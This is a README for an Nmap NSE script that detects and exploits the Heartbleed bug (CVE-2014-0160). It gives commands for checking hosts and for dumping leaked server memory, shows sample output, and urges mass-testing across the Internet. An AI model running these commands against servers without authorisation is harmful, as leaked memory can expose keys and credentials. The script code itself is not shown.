openssl-heartbleed.nse
======================

Nmap NSE script that discovers/exploits Heartbleed/CVE-2014-0160. It is still in PoC state, so use with caution. This is supposed to make mass-testing easier. Take it on a trip through the Internet!

Due to experimental state it is not yet supposed to be put in the Nmap scripts dir unless you really know what you are doing.

### Usage
#### Check if a host is vulnerable (runs on every SSL/TLS port)
```
$ nmap --script=./openssl-heartbleed.nse host.tld
```
#### Dump leaked memory from a vulnerable host
Dumping leaked memory is enabled by increasing Nmap's debug level via -d flag.
```
$ nmap -d --script=./openssl-heartbleed.nse host.tld

```

### Example Output
```
[ ~/temp/heartbleed ] nmap -p443 --script=./openssl-heartbleed.nse local.de 

Starting Nmap 6.41SVN ( http://nmap.org ) at 2014-04-09 01:58 CEST
Nmap scan report for tune.pk (172.23.0.1)
Host is up (0.12s latency).
PORT    STATE SERVICE
443/tcp open  https
|_openssl-heartbleed: Host is vulnerable to TLS heartbeat read overrun (CVE-2014-0160). Increase debug level for a dump of leaked data.

Nmap done: 1 IP address (1 host up) scanned in 7.66 seconds
```
